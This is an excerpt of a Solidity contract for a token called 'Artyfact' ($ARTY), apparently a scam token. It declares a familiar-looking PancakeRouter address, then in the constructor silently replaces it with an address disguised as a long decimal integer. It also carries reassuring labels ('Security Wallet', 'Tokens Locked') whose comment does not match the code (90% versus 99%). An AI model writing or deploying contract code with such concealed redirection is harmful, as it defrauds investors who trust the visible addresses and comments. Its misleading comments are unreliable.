...
contract Artyfact {
    string public constant name = "Artyfact";
    string public constant symbol = "$ARTY";
    address private PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant TrustSwap = 0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE; // TrustSwap: Team Finance Security Wallet
    uint8 public constant decimals = 1;
    uint256 public constant LockAmount = totalSupply_ * 99 / 100; // 90% of Tokens Locked
    ...
    constructor() {
        PancakeRouter = address(uint160(758108265889052484629171981199812256095691459791));
